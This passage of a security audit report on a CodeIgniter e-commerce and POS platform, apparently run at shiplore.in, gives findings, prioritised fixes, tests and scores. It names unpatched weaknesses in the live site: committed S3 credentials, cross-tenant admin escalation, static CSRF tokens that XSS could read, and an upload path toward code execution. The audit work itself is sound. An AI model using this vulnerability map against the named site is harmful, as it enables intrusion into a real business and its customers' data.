**Location:** `app/Config/Services.php:610-613`, `:710-713`; `PosSaleRepository.php:81`, `PosReturnRepository.php:142`, `StoreOrderRepository.php:52`, `CartService.php:201`, `VendorPosController.php:536`, `app/Commands/OrdersEscalate.php`.
**Description:** `Config\Services` is used consistently across the codebase — except for two definitions that are declared and never used. `service('gstCalculator')` has **zero** call sites; five separate `new GstCalculator()` exist instead. Same for `escalationService`, whose cron entry point does `(new EscalationService())->escalatePending()`. `GstCalculator` is stateless so there is no bug today — this is maintainability, and it matters **because of L10**: the moment the class gains constructor state (a rounding mode, an injected rate table, a `Money` scale), five hard-coded `new` calls silently keep the old behaviour while the service definition carries the new one, and store checkout rounds differently from whatever went through the container. Direct instantiation is also why `CartService::totals()` had to add an `?GstCalculator $gst = null` parameter purely for test injection — a workaround the container already solves.
**Fix:** Replace each `new GstCalculator()` with `service('gstCalculator')` (keeping `CartService`'s `$gst ?? service('gstCalculator')` so an explicitly injected instance still wins and the test seam survives), and `(new EscalationService())` with `service('escalationService')`. Drop the now-unused imports.
**Regression Risk:** Low — no constructor, no mutable state, so sharing one instance per request is behaviourally identical; computed values cannot change. Only object identity differs, and no code does `instanceof`/`===` on it. All five sites are inside methods, not constructors, so there is no service-resolution-order issue.
**Testing:** *Works:* store checkout, web POS sale, POS return and mobile POS sale — assert stored `taxable_value`, `cgst`, `sgst`, `igst`, `grand_total` are **byte-identical** to a pre-change run; only the construction path moved. *Closed:* `grep -rn "new GstCalculator\|new EscalationService" app/` returns nothing outside `Config/Services.php`; `php spark orders:escalate` escalates the same sub-orders.

---

#### L12 — Admin master CRUD lives in a controller trait that queries the database directly
**Severity:** Low
**Location:** `app/Controllers/Admin/Concerns/MasterCrud.php:33`, `:75`, `:102`, `:113-122`; wired at `app/Config/Routes.php:372-382`.
**Description:** The codebase has a clear, otherwise-observed layering rule: 104 repositories own persistence, controllers reach them through `Config\Services`. `MasterCrud` is a trait mixed into controllers that opens its own connection and runs SELECT/INSERT/UPDATE against a table name from the host controller's `masterSpec()`. It backs seven live masters including units, tax classes, **HSN codes** and zones.
**Checked and NOT wrong:** this is not injection and not mass assignment — `$s['table']` is hard-coded per controller and never from the request; `masterCollect()` builds `$data` strictly from the whitelisted `$s['fields']`; every entry point calls `$this->guard(...)` first.
**What is wrong** is architectural with a concrete cost: because the writes never pass a repository, they inherit none of the cross-cutting behaviour — **no `auditWriter` entry**, no notification hook, no tenant-scope assertion, and no place for the change-request governance gate to attach (whose stated principle is that appliers "call the SAME repository the direct path uses, so approved and direct writes can never diverge"). Changing an HSN code's rate changes GST on every mapped product and today leaves **no audit trail** — the only trace is `updated_by`, overwritten by the next edit.
**Fix:** Keep the trait (the generic-spec pattern is genuinely useful; removing it means duplicating CRUD across seven controllers) but move the three statements behind a thin `App\Models\MasterRepository` with `all()`, `find()`, `create()`, `update()` — the last two wrapping a try/catch `auditWriter` call — registered in `Config\Services`. Verify `AuditWriter::log()`'s expected array shape against the existing callers in `governanceAppliers()` before wiring it.
**Regression Risk:** Low — the SQL moves, it does not change (same table, where clauses, limit, ordering, `$data`). Two things to check: the audit call is **new** behaviour, so confirm `audit_logs` accepts a bare table name as `entity_type` and that `admin/audit-logs` renders the entries (it is try/catch-wrapped so it cannot break a save, but malformed rows would be noise); and migrate `toggle()` in the same pass, or the two halves of the trait will use different persistence paths — exactly the split this finding is about.
**Testing:** *Works:* for each of the seven masters, create, edit, toggle and list — flash messages, redirects and validation errors unchanged; a user without the permission still gets the guard redirect on each action. *Closed:* `grep -n "Database::connect" app/Controllers/Admin/Concerns/MasterCrud.php` returns nothing; create and edit an HSN code and confirm create + update entries appear in `admin/audit-logs` with the right actor.

---

#### L13 — Half the security-header set exists only in `.htaccess` and will vanish on the planned DocumentRoot move; COOP/CORP absent
**Severity:** Low
**Location:** `app/Config/Filters.php:88-103` vs `.htaccess:79-96`; `public/.htaccess` has no header directives.
**Description:** Headers are set in two places that do not agree. CI4's `secureheaders` filter emits `X-Frame-Options`, `X-Content-Type-Options`, `X-Download-Options`, `X-Permitted-Cross-Domain-Policies` and `Referrer-Policy`. The root `.htaccess` additionally emits **`Permissions-Policy`** and the enforcing **`Content-Security-Policy: frame-ancestors 'self'`** — and those two exist *only* there. The Filters config itself flags the hazard ("it stops applying the moment the DocumentRoot moves to public/ (the planned change) or the file is lost") and then does not carry them into the app. So after the documented move the site silently loses its clickjacking CSP and its Permissions-Policy while every header dump still looks broadly healthy. Separately, none of COOP/CORP/COEP is set anywhere — COOP in particular is cheap and relevant: without it, a page opened via `window.open` from a hostile origin retains a `window.opener` handle to the admin portal.
**Fix:** A small `App\Filters\SecureHeaders extends CodeIgniter\Filters\SecureHeaders` that adds `Content-Security-Policy: frame-ancestors 'self'`, the identical `Permissions-Policy` string, `Cross-Origin-Opener-Policy: same-origin` and `Cross-Origin-Resource-Policy: same-site`; point the existing `secureheaders` alias at it (`$globals` unchanged). Values match the `.htaccess` exactly, and Apache's `Header always set` still wins where both set the same header, so effective behaviour today is unchanged. **COEP is deliberately omitted** — `require-corp` would break the Firebase and Google Maps loads the CSP config allows.
**Regression Risk:** Low, with two things to watch. `Cross-Origin-Resource-Policy: same-site` stops other origins embedding our resources — correct for `/media/*` on our own storefront, but it breaks any third party hotlinking our images (a marketplace feed, a partner site, an email client rendering an `<img>` from our domain); use `cross-origin` if such an integration exists. COOP `same-origin` can break an OAuth/payment popup that talks back via `window.opener` — PayU and Razorpay here are full-page redirects, but confirm before shipping. Duplicate identical CSP headers intersect to a no-op; note this app-set CSP is a different header name from CI4's report-only one, so they do not interact.
**Testing:** *Works:* storefront, admin, vendor and monline render; the Firebase phone-auth widget completes an OTP on all four sign-in pages; the Google Maps address picker initialises at checkout; one PayU and one Razorpay test payment complete the return-to-site step; a storefront product image displays. *Closed:* `curl -sI https://shiplore.in/admin/dashboard` shows all four headers; then **prove they survive** — temporarily rename the project-root `.htaccess` on staging (or test with `public/` as DocumentRoot) and re-run the same curl, all four still present. Framing the admin dashboard from another origin is refused.

---

### INFO

---

#### I1 — Storefront browse depends on indexes created only by ad-hoc PHP scripts, and uses `FORCE INDEX` against them
**Severity:** Info *(unverified against production — **run the check today**)*
**Location:** `app/Models/StoreCatalogRepository.php:88-89`, `:164`, and four further methods; `database/sql/perf2_indexes.php:24`; `database/sql/run_all.sql`.
**Description:** Five methods hard-code `FORCE INDEX (idx_products_cat_status_del)` and `computeTree` uses `USE INDEX` on the same key. That index is created by **no numbered `.sql` file** — it exists only in `perf2_indexes.php`, a standalone script with hard-coded credentials, and `run_all.sql` lists only `NN_*.sql` files and cannot source PHP. MySQL raises `ER_KEY_DOES_NOT_EXIST` (1176) for a `FORCE INDEX` naming a missing key — a hard error, not a silent fallback. So on any database built from `run_all.sql` alone — a staging clone, a rebuilt replica, a restored DR copy, a fresh dev environment — **the entire storefront browse, the mobile catalogue API and the facet worker fail with a SQL error** rather than degrading. Reported as Info only because whether the index currently exists in the live database could not be verified from here.
**Fix:** Promote the performance indexes into the numbered, idempotent series (a new `database/sql/75_catalog_indexes.sql` with `ADD INDEX IF NOT EXISTS` for `idx_products_cat_status_del`, `idx_products_status_created`, `idx_variants_product_default`, `idx_inventory_shop_avail`) and add it to `run_all.sql`. Keep `perf2_indexes.php` — it is guarded and idempotent, so both applying is harmless.
**Regression Risk:** Low — on a database where `perf2_indexes.php` already ran, `IF NOT EXISTS` is a no-op. Where they are missing, the ALTER builds them (online for secondary indexes on MariaDB 10.11, but it takes time on a large table). No query results change. Note `ADD INDEX IF NOT EXISTS` is MariaDB syntax — the project already uses it in `54_product_shops_index.sql` — so this file is not portable to MySQL 8.
**Testing:** *Gap:* on a scratch database, run `run_all.sql` then `SHOW INDEX FROM products WHERE Key_name='idx_products_cat_status_del'` — expect empty before, one row after. *Works:* with the new file applied to that scratch DB, `/store/products?category=<slug>` and `/api/v1/customer/products?category=<slug>` return results instead of a 500. **On production, run `SHOW INDEX FROM products` today** and confirm all four are present before assuming browse is safe.

---

#### I2 — JWT verification ignores the token header and enforces no issuer, audience or not-before claim
**Severity:** Info — **not exploitable as built**
**Location:** `app/Libraries/TokenService.php:50-74`.
**Description:** `verify()` recomputes `hash_hmac('sha256', …)` over the received header and payload and compares with `hash_equals`. The header is **never parsed**, so `alg` is decorative — which is precisely what makes the usual `alg: none` and RS256→HS256 confusion attacks fail here: the expected signature is always the HS256 HMAC and a mismatch is rejected regardless of what the header claims. Confirmed by construction (`hash_equals('<real hmac>', '')` is false; no code path reads `$header['alg']`). The secret side is genuinely well handled — `secret()` fails closed rather than signing with the committed placeholder, and `JwtAuthFilter` turns that into a clean 503 instead of an HTML 500. What is missing is claim narrowing: no `iss`, no `aud`, no `nbf`, and `exp` enforced only `if (isset($claims['exp']))` — every issuer sets it, so that branch is unreachable today, but it is a latent hole if a future caller forgets. Because tokens carry no audience, one signing key covers every surface: customer, vendor-POS and platform tokens are structurally identical and differ only in `typ`, so any future endpoint that trusts `typ` without a DB re-check inherits whatever the claim says.
**Fix:** Defence in depth, matching the style of the Firebase verifier in the same codebase: parse the header and reject anything but `HS256`, and make `exp` mandatory (`if (! isset($claims['exp']) || $now > (int) $claims['exp'])`).
**Regression Risk:** Low — both checks accept every token this application has ever issued (`issue()` hardcodes `['alg'=>'HS256','typ'=>'JWT']` and always sets `exp`). Only tokens this codebase cannot produce would now fail. Any TokenService unit test that hand-builds a token without `exp` or with a different header needs its fixture updated.
**Testing:** *Works:* tokens from all four mint paths authenticate behind `jwtAuth`, and `/api/v1/auth/refresh` still exchanges one; `composer test` TokenService suite unchanged. *Closed:* a hand-crafted `{"alg":"none"}` token is rejected before the signature comparison; a validly-signed HS256 token with no `exp` is rejected.
**Also:** confirm out-of-band that the production `jwt.secret` is a high-entropy per-environment value (32+ random bytes) — `secret()` only rejects the empty string and the known placeholder, and the production `.env` was not readable from here.

---

#### I3 — CSRF and CSP posture: coverage is good, but tokens are static per session
**Severity:** Info — context that sets the blast radius of the XSS findings
**Location:** `app/Config/Security.php:8`, `:12`; `app/Config/Filters.php:81`; `app/Config/ContentSecurityPolicy.php:41`.
**Description:** Recording verified configuration rather than a defect. CSRF coverage is thorough and no gap was found: the global filter is commented out but 344 route entries carry `['filter' => 'csrf']`; every mutating non-API route was enumerated and the only exceptions are the two hash-verified PayU redirect-backs (`Routes.php:99-100`, annotated as such). Everything else without `csrf` is under `api/*` with `jwtAuth` — Bearer auth a cross-site form cannot supply — and CORS is closed by default (`allowedOrigins: []`, `supportsCredentials: false`). No state-changing GETs; the `*/export` GETs are read-only. Two settings weaken defence in depth: `$tokenRandomize = false` and `$regenerate = false` mean the CSRF hash is a **stable per-session secret**, published in `<meta name="csrf-hash">` by every layout — so any XSS reads it once and can then drive any state-changing route (this is the actual payoff of H5, given `httponly` blocks cookie theft). And the CSP is report-only with no report URI (M10). Net: an XSS anywhere in a session-authenticated surface owns the session's write capability.
**Fix:** No code change proposed here beyond M10's report sink. **Do not** flip `tokenRandomize` to `true` without first verifying `public/assets/js/ajax-forms.js:104-113` (`rotateCsrf`) against a randomised hash — that path already reads `res.csrf` and the `X-CSRF-TOKEN` header so it would probably survive, but that needs verification, not assumption.
**Regression Risk:** n/a (no change).
**Testing:** n/a.

---

#### I4 — The staff login page renders a non-functional "Remember me" checkbox
**Severity:** Info
**Location:** `app/Views/auth/login.php:38`; `Auth\LoginController::attempt()` (`:73-107`).
**Description:** The checkbox has no `name` attribute so it is never submitted, and `attempt()` has no persistent-login handling of any kind — no long-lived token, no cookie. Sessions always expire on the 7200-second `Config\Session::$expiration` regardless. There is no security defect in the mechanism (the safest remember-me is the one that does not exist, and no persistent-token table is being written), but the control misrepresents behaviour to the user: someone who ticks it may believe their session is deliberately extended and behave accordingly on a shared machine. Recorded because the brief asked specifically about remember-me token handling, and the answer is that there is none.
**Fix:** Remove the dead control so the page describes what the system does. **Do not implement persistent login to make the checkbox real** — that means a new long-lived credential, a token table and a revocation story, i.e. a feature. The identical inert checkbox in the UI-kit demo pages has no controller behind it and can be left alone.
**Regression Risk:** Low — not read by any server code and not referenced by any JavaScript on the page. The row collapses to just the "Forgot password?" link, which `justify-content-end` keeps right-aligned.
**Testing:** *Works:* `/login` renders on admin, vendor and manufacturer hosts; the "Forgot password?" link is correct; password and Firebase OTP sign-in both succeed. *Closed:* no `id="remember"` input in the source; session lifetime unchanged.

---

## 4. Top 20 Critical Fixes

Ordered by the sequence I would actually ship them.

1. **Rotate the S3 access/secret pair** and delete the old key at the provider (C1). Nothing else on this list matters if those keys stay live.
2. `git rm --cached s3_storage/.env`, extend `.gitignore` to `**/.env`, gut `s3_storage/public/s3test.php` (C1).
3. **Add `$ctx->isPlatform()` to the ~60 admin `guard()` methods** and the 10 inline checks (C2). Run the `user_roles` scope-type query first.
4. **Fix the brand-logo extension** to come from `getMimeType()` against a five-entry allow-list, plus the SVG sandbox CSP header (C3).
5. **Change `Admin\SettingsController::guard()` to require `settings.update`** for the two save actions (C3, second half).
6. **Add the `isActive()` re-check to `WebAuthFilter::before()`** and delete the dead `sessions` DELETE from both revoke sites (H1).
7. **Add the lockout + `login_attempts` audit to `AuthApiController::login()`** (H2).
8. **Gate `settlements`/`settlement`/`commissionLedger`/`gstSummary`/`staffList`/transfers on `isOwner()`** in `VendorApiController` (H3).
9. **Fix `RefundService::complete()` to use `returns.sub_order_id`** (H10). Then reconcile the historical ledger separately.
10. **Add `JSON_HEX_TAG` to the JSON-LD encode** and strip attributes in `$rich` (H5). Two lines, public surface.
11. **Canonicalise the category slug before it becomes a FacetCache key**, add the single-flight lock to `refreshFor()` (H6).
12. **Route `CustomerApiController::brands()` through `brandFacets()`** (H9). One-word change.
13. **Move the availability check inside the transaction with `FOR UPDATE`** in `StoreOrderRepository::place()` (H7).
14. **Make the coupon `used_count` increment conditional** (`used_count < usage_limit`) and re-count the per-user limit under that row lock (H8).
15. **Add `vendor/.htaccess`** with `Require all denied` (M28). Two minutes, closes the SBOM disclosure.
16. **Redeploy with `composer install --no-dev --optimize-autoloader`** (M28).
17. **Replace `"*"` with caret ranges** for box/spout, dompdf and aws-sdk-php (M29). Metadata only; the lock does not move.
18. **Stop logging the raw reset link**, then rotate/purge `writable/logs/` (M5).
19. **Add `party_type` to `VendorAccountRepository`** after running the NULL check (M11).
20. **Push the coupon discount down to sub-orders** (H11) — highest accounting value, highest regression risk; schedule it deliberately with the accounting owner, and ship the additive `discount_total` write first if that conversation will take time.

---

## 5. Top 20 Performance Improvements

1. Canonicalise unresolvable category slugs before they become FacetCache keys — removes an unbounded anonymous amplification vector and stops `category_facet_summary` growing (H6).
2. Add the single-flight lock to `FacetCache::refreshFor()` so N concurrent cold requests compute once (H6).
3. Route `brands()` through the cached `brandFacets()` wrapper — removes a full-catalogue GROUP BY per anonymous request (H9).
4. Add `idx_suborders_del_created` and `idx_orders_del_created` — turns the admin dashboard's full scan + filesort into an 8-row index read (M21).
5. Add `idx_products_del_created` so the default admin product list stops filesorting (M20).
6. Cap `AdminProductRepository::list()` at 5,000 rows so `?per_page=all` and the CSV export cannot OOM a worker (M20).
7. Memoise `StoreShopRepository::nearbyShopIds()` — eliminates 7 of 8 identical bounding-box + Haversine passes on the storefront home page (M25).
8. Bound the `nearby()` SQL with `limit(max($limit*5, 500))` so a dense metro cannot hydrate unbounded shop rows into PHP (M25).
9. Memoise `SettingsRepository::get()` — removes ~5-10 identical `settings` SELECTs per page render, most of them from inside views (M30).
10. Batch the items and invoice lookups in `StoreOrderRepository::track()` — 61 queries → 21 for a 20-item order, on a **polled** mobile endpoint (M23).
11. Memoise `purchaseRulesForVariant()` per request — removes the duplicate lookup inside `qtyError()`, one query per cart line (M22).
12. Cap cart lines at 100 so an unbounded client item list cannot generate thousands of queries in one request (M22).
13. Batch `snapshotRows()` with two `whereIn` reads — turns `2 × |variants| × |shops|` into 2 queries (M26).
14. Clamp the monline `?page=` against the real page count before it becomes an OFFSET (M24).
15. Cache monline `manufacturers()` and `categories()` for 300s — removes two full-catalogue `COUNT(DISTINCT)` GROUP BYs per page view (M24).
16. Add `idx_mshops_status_del` so the monline distance subquery's inner scan is keyed (M24).
17. Change the audit-log filter to a prefix `LIKE` so `idx_audit_action` becomes usable on an ever-growing table (L8).
18. Add `throttle:120,60` / `throttle:60,60` to the public `customer/products`, `customer/home`, `customer/brands` and `customer/shop-categories` routes (H6, H9) — **verify against real traffic and remember `proxyIPs` is empty**.
19. Drop one of the two full in-memory CSV copies in `ProductController::export()` (`unset($rows)` before the response buffers) (M20).
20. Promote the `perf*.php` indexes into the numbered migration series so a rebuilt database is not merely slow but *functional* — five methods `FORCE INDEX` against one of them (I1).

Two further areas were flagged but not audited in depth and would likely yield more of the same: `PosSyncRepository`, `RiderRepository` (811 lines) and `SyncEngineRepository` — a `foreach`-scan flagged N+1 and locking candidates in all three. A second pass focused there is worth a day.

---

## 6. Top 20 Security Improvements

1. Rotate the committed S3 credentials and untrack the file (C1).
2. Require `isPlatform()` in every admin guard (C2).
3. Derive the upload extension from the server-detected MIME in `saveSystem()` (C3).
4. Change the settings-save guard from `settings.view` to `settings.update` (C3).
5. Re-check account status on every authenticated web request (H1).
6. Per-account lockout + `login_attempts` audit on `POST /api/v1/auth/login` (H2).
7. Owner gates on the vendor API's financial and staff endpoints (H3).
8. Begin applying the `perm:` filter that already exists, one route group at a time, log-only first (H3).
9. Close the customer/rider lane in `checkPrincipal()` now; stage the `auth.enforcePrincipalType` flip after a traffic-day log review (H4).
10. Move `admin/portal/leave` out of the pinned group so the flip is shippable (M16).
11. Strip attributes from allow-listed tags in `$rich`; add `JSON_HEX_TAG` to the JSON-LD (H5).
12. Use SweetAlert2's `titleText` instead of `title`, and build the uploader error node with `textContent` (M32, M33).
13. Add an owner/tenant predicate to private media, shipped log-only behind `media.enforcePrivateOwner` (M1).
14. Serve private media with `private, no-store, must-revalidate` (M2).
15. Force non-inline media types to download and sandbox SVG in both vendor `file()` endpoints (M3).
16. Constrain the storage-key extension in `safeKey()` and cap the PUT body in `saveDummy()` (M4).
17. Stop logging the raw reset link; rotate existing logs (M5).
18. Bind JWTs to the password hash so a password change actually revokes them; rotate the session on self-service change (M6).
19. Regenerate the session ID on the customer OTP path and destroy it on store/rider logout (M7).
20. Add HSTS (30-day max-age, no `includeSubDomains`, no preload) plus an http→https redirect, and fix `public/.htaccess`'s redirect-to-http (M9).

Beyond twenty, and genuinely worth doing: neutralise CSV formula triggers in the two admin exports (M31); add `vendor/.htaccess` (M28); scope the price-list/tier deletes (M12); shop-scope the transfer lifecycle actions (M13); permission-gate `addRider` (M14); refuse to adopt existing users by phone in the staff API (M15); give the CSP somewhere to report so the rollout can progress (M10).

---

## 7. Work sizing

### Quick wins (< 30 min each)

- `git rm --cached s3_storage/.env` + `.gitignore` update (C1 step 2).
- Add `vendor/.htaccess` (M28).
- `JSON_UNESCAPED_SLASHES | JSON_HEX_TAG` on the JSON-LD line (H5, sink B).
- `computeBrandFacets()` → `brandFacets()` (H9).
- `titleText:` instead of `title:` in `ajax-forms.js` (M32).
- Replace the three `"*"` constraints with caret ranges (M29 step 1).
- Stop logging the raw reset link (M5).
- Branch the media `Cache-Control` on visibility (M2).
- `JSON_HEX_APOS|JSON_HEX_QUOT|JSON_HEX_TAG|JSON_HEX_AMP` on the three banners sites (L4).
- Fix the `data-confirm` attribute in the master list (L5).
- `->where('visibility', 'public')` in `vendorImages()` (L6).
- `like(..., 'after')` in `AuditLogRepository::list()` (L8).
- Validate the two POS export dates (L3).
- `log_message('critical', …)` in the lockout catch block (L7).
- Add the `isActive()` block to `WebAuthFilter` (H1) — small, but test it before it goes out.
- Move `admin/portal/leave` above the admin group (M16).
- Remove the dead "Remember me" checkbox (I4).
- **Run `SHOW INDEX FROM products` on production** and confirm the four `perf2` indexes exist (I1). Two minutes; potentially prevents an outage on the next rebuild.
- **Run the two pre-flight queries**: platform users with a non-platform scope_type (C2), and `SELECT party_type, COUNT(*) FROM vendors GROUP BY 1` (M11).

### Medium tasks (1-4 hrs each)

- Add `isPlatform()` to ~60 admin guards + 10 inline checks, then empty `KNOWN_GAPS` and run the suite (C2).
- Brand-logo MIME allow-list + SVG CSP header + `settings.update` guard (C3).
- API login lockout and audit (H2).
- `isOwner()` gates on six `VendorApiController` methods (H3).
- `RefundService` sub-order resolution (H10).
- `$rich` attribute stripping (H5, sink A).
- Slug canonicalisation + single-flight lock in FacetCache (H6).
- `FOR UPDATE` in `StoreOrderRepository::place()` + line sorting (H7).
- Conditional coupon UPDATE + locked per-user re-count (H8).
- The two report indexes and the products index, as a numbered migration (M20, M21).
- `nearbyShopIds` memo + SQL cap (M25); `SettingsRepository` memo (M30).
- Batch `track()` (M23); memoise + cap cart validation (M22); batch `snapshotRows()` (M26).
- monline page clamp + two 300s caches + `mshops` index (M24).
- `safeKey()` extension allow-list + `saveDummy()` cap, after the historical-key query (M4).
- Inline/attachment split in both vendor `file()` endpoints (M3).
- `party_type` predicate (M11); price delete scoping (M12); transfer shop scope (M13); `addRider` gate (M14).
- CSV formula neutralisation in the two exports (M31); uploader `textContent` fix (M33).
- `FOR UPDATE` claim in `PurchaseOrderRepository::receive()`/`transition()` (M17).
- Ledger row on storefront placement (M19).
- `StatusMachine` as the single delivery owner (M27) — **after** confirming intent with operations.
- CSP report sink controller + route + `reportURI` (M10).
- `App\Filters\SecureHeaders` subclass (L13).
- `StatusMachine::canRefund()` guard in `RefundRepository` (L9).
- `service('gstCalculator')` at five sites + the escalation cron (L11).

### Large tasks (> 1 day each)

- **Push the coupon discount down to sub-orders** (H11) — the code change is an hour; the accounting decision, the GST-report step-down communication, the vendor settlement-basis change and the invoice-template verification are the day.
- **Rotate the S3 credentials end to end** (C1) — coordinate the two-sided swap, the self-test, the media/KYC verification pass, and the old-key revocation.
- **Session and token revocation** (M6 + M8): the `pwd` claim across four mint sites and the filter, `regenerateDestroy = true` staged with heartbeat/AJAX monitoring, plus the release-note that a password change now signs users out of the app.
- **`media.enforcePrivateOwner` rollout** (M1): ship log-only, run the `owner_type × visibility` census, widen the predicate for every real combination, review a traffic day, then flip.
- **`auth.enforcePrincipalType` rollout** (H4): only after C2 and M16, then a traffic-day log review, then a staging flip, then production.
- **HSTS and HTTPS enforcement** (M9): certificate coverage audit across every hostname in `$allowedHostnames`, proxy-scheme verification, ACME challenge path check, one hostname at a time.
- **Wiring `perm:` across `api/v1`** (H3 part 2): the seeded role→permission map has never been exercised against live traffic; this is a per-group, log-only-first campaign, not a commit.
- **`box/spout` → `openspout`** (M29 step 2): needs dependency sign-off and a real-customer-XLSX round-trip test, because a silent parsing behaviour change corrupts catalogue data rather than erroring.
- **`GstCalculator` on `Money`** (L10): tax arithmetic on the checkout path; needs the table-tests, the closed-period report comparison and a decision about `PurchaseInvoiceService`'s separate 3-dp implementation.
- **Decomposing `Api\V1\VendorApiController`** (1,884 lines, 79 endpoints, 20 tables reached directly) — the highest-value structural work available, and explicitly out of scope for a behaviour-preserving pass.

---

## 8. Technical debt

**The dominant pattern is duplicated logic that has drifted**, and it lands on money and operations rather than on style. Three confirmed instances: `RefundService` re-deriving a sub-order the `returns` row already names (H10); coupon discounts applied to tax at cart level and not at sub-order level (H11); delivery transitions implemented twice with five disagreements (M27). A fourth, adjacent: `PurchaseInvoiceService::lineMath()` is a second, differently-rounded implementation of the GST rule (L10).

**Good abstractions exist and are not reached for.** `PermissionFilter` and `TenantScopeFilter` are implemented, tested, aliased and applied to zero routes. `StatusMachine::canOrder()` and `::canRefund()` are unit-tested and called from nowhere, so refund statuses are written unguarded. `service('gstCalculator')` and `service('escalationService')` have zero callers while six sites do `new`. `Money` exists specifically to prevent float drift on money, and the tax engine uses floats. `ScopeContext::isPlatform()` exists and is used by exactly one of ~60 admin guards.

**Zero of 123 controllers use CI4's validation service** — every one hand-rolls its checks. This is the single largest consistency gap in the codebase. It is *not* reported as a finding because converting them is exactly the business-logic redesign this audit was asked to avoid, but it deserves a deliberate decision rather than continued drift: pick a direction, write it down, and apply it to new controllers at minimum.

**Layering is inconsistent at the edges.** `Api\V1\VendorApiController` (1,884 lines, 79 public endpoints, 8 private helpers) reaches the query builder directly for 20 tables including `vendors`, `users`, `products`, `sub_orders`, `inventory_ledger`, `commission_ledger`, `change_requests` and `vendor_documents` — bypassing most of the 104-model repository layer it sits on. That is why its staff endpoints write columns that do not exist on `staff_shop_assignments` (M15) and why they never got the ownership predicates the web path has. `MasterCrud` does the same at a smaller scale for seven admin masters, which is why HSN rate changes leave no audit trail (L12). Next largest: `CustomerApiController` (1,371), `VendorPosController` (811), `AdminProductRepository` (939), `RiderRepository` (811), `StoreOrderRepository` (781).

**Half-finished rollouts.** Three staged mechanisms are stuck in phase one with no forcing function: the principal-type pin (log-only, blocked by the impersonation exit), the CSP (report-only with no report sink, so the traffic-day inventory it depends on cannot be collected), and the `perm:`/`tenantScope` filter spine (wired, never applied). Each has a correct plan written in a comment and no owner. Worth putting the three on a calendar rather than leaving them as permanent "phase one".

**Operational fragility in the database layer.** The performance indexes the storefront `FORCE INDEX`es against live only in standalone PHP scripts outside the numbered migration series (I1). `writable/` sits inside the DocumentRoot with a four-line `.htaccess` as the only thing between a vendor PUT and code execution (M4). `database.sql` is a 2.2 GB dump in the project root. `writable/` is 138 MB with no log retention policy while logs grow ~20 MB/day.

**Dead and misleading code.** The `auth_tokens`/`sessions` revocation that affects zero rows while its comment claims otherwise (H1) is the most dangerous kind of debt — it reads as a working control. The `DeliveryRepository::FLOW` constant duplicating `StatusMachine`. The "Remember me" checkbox that submits nothing. `StatusMachine::DELIVERY`'s `'reassigned'` state, which belongs to a different table's column.

---

## 9. Future hardening recommendations

**Make the enforcement layers real, then keep them honest with tests.** The `AdminGuardScopeTest` shrink-only-list pattern this project already invented is the right mechanism and should be replicated: one test asserting every `api/v1/vendor` route either carries `perm:` or calls `isOwner()`/`inShopScope()`; one asserting every `Admin\*` guard includes `isPlatform()`; one asserting no controller trait touches `Database::connect()`. A list that may only shrink turns a one-off fix into a ratchet.

**Give `PolicyEngine::can()` the scope it already collects.** `CapabilityRepository` groups permissions by scope and `CapabilityResolver` throws that structure away. Preserving it and making `can($ctx, $permission, $scopeType)` the signature would make C2 structurally impossible rather than fixed-by-inspection at 70 call sites. This is a real refactor with real risk — schedule it, do not squeeze it in — but it is the change that stops this class of bug recurring.

**Move sessions to the DatabaseHandler.** It is the prerequisite for genuine server-side revocation: it makes `DELETE FROM sessions WHERE user_id = ?` actually work (H1's dead code becomes live code), it makes "sign out all devices" implementable, and it removes the `regenerateDestroy` trade-off (M8) by making stale IDs enumerable. Bigger than this audit's constraints allowed, but it is the correct destination.

**Give JWTs a `jti` and a deny-list table.** The `pwd`-claim fix in M6 is a good 80% solution with no schema change, but a real revocation story needs identifiable tokens. Do it when you next touch the token format, and add `aud` at the same time so a customer token is structurally distinguishable from a platform one (I2).

**Adopt a locking convention for money and stock, and write it down.** Four independent read-check-write defects (H7, H8, M17, M18) with zero `FOR UPDATE` in the codebase is a systemic gap, not four bugs. The rule is short — *any check whose outcome authorises a write must be made under the lock that write will take* — and once written it is reviewable.

**Add a dependency and secret pipeline.** `composer audit` in CI (it would have flagged the abandoned package without a human), a pre-commit or CI grep for `**/.env` and for high-entropy strings in tracked files (it would have caught C1 before it was pushed), and `composer install --no-dev` as the deployment default rather than something to remember.

**Finish the CSP rollout properly.** Report sink (M10) → traffic-day inventory → nonces on the inline blocks `autoNonce` already supports → enforce. An enforcing `script-src` is the control that would have made H5 an annoyance rather than a session compromise, and it is the highest-leverage remaining defence-in-depth item.

**Instrument the fail-open paths.** L7 is one example; the pattern (`catch (Throwable) { return <safe default>; }`) appears in several repositories. Failing open is often right; failing open *silently* never is. A `critical` log line costs nothing and turns an invisible degradation into a page.

**Get a second pass over POS/sync/rider.** `PosSyncRepository`, `RiderRepository` and `SyncEngineRepository` were not audited in depth and a mechanical scan flagged N+1 and locking candidates in all three. Given that the same patterns found elsewhere turned out to be real, budget a focused day.

**Reconsider the DocumentRoot.** Moving the vhost to `public/` removes an entire class of exposure (M4's `writable/`, M28's `vendor/`, the loose-file deny lists) — but note it also silently drops `Permissions-Policy` and the enforcing `frame-ancestors` CSP unless L13 ships first. Sequence: L13, then the move.

---

## 10. Scores

**Overall Security — 4/10.** Three confirmed Criticals, one of which (C2) requires nothing but an ordinary vendor login to read and write every other tenant's data, and one of which (C1) is a live credential in pushed git history. The primitives — bcrypt, `hash_equals`, parameterised SQL, thorough CSRF, fail-closed secrets — are genuinely above average; the enforcement layers that were supposed to use them are not wired.

**Overall Performance — 5/10.** Real, measured engineering in the storefront path (SWR facet cache with a durable backing table, index hints carrying before/after numbers, deliberate filesort avoidance) sitting alongside anonymous unthrottled amplification vectors, four unlocked read-check-writes on money and stock, and N+1s on a polled mobile endpoint. It is fast where someone looked and fragile where nobody has yet.

**Maintainability — 6/10.** Explicit routes, a real service container, 104 repositories, and unusually good explanatory comments that repeatedly told me *why* — several of which correctly diagnosed the very defects reported here. Held down by duplicated-and-drifted business logic on money, three half-finished rollouts with no owner, an 1,884-line controller bypassing the repository layer, and zero use of the framework's validation across 123 controllers.

**Production Readiness — 4/10.** It is in production and functioning, so this is not a verdict on whether it runs. It is a verdict on the gap between running and operable: credentials that must be rotated, a cross-tenant escalation live today, GST returns filed off an over-declared basis, no working way to revoke access from a dismissed staffer, and a storefront whose query plans depend on indexes that a database rebuild would not create. Every one of those is fixable in days, and most of the fixes in §4 are low-risk.

---

## 11. Flow-preservation statement

